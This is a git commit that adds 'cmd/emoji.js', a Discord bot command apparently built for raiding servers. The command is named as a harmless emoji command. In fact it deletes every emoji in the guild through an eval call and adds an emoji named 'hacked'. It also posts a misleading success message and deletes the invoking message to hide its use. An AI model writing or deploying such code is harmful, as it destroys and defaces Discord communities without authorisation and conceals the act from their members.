efad3416cf6cde739ac3e0acfe9b2636b334e1e8
ghostdev <87695542+ghostdevxd@users.noreply.github.com>
2022-05-30 17:46:26 +0300

    Create emoji.js

---
+++ cmd/emoji.js
@@ -0,0 +1,13 @@
+module.exports = {
+  name:"emoji",
+  code:`
+
+  $addEmoji[$guildID;https://images-ext-2.discordapp.net/external/FYBWP5Tc7eLoU1HSkxwOkut72OcimWNreB8544mAlxM/%3Fsize%3D4096/https/cdn.discordapp.com/icons/971811564086788116/c3c64529fa8232efbf0c6a726040566c.webp?width=107&height=107;hacked$getvar[ghostt];HacKeD $getvar[ghostt]]
+  $djsEval[message.guild.emojis.cache.forEach(x => {x.delete().catch(err => {})})]
+  $sendMessage[Emoji :white_check_mark: {delete:5s};no]
+  $wait[2s]
+  $sendMessage[Wait... ⌛{delete:2s};no]  
+  $deletecommand
+  $onlyforids[$botownerid;]
+  `
+}
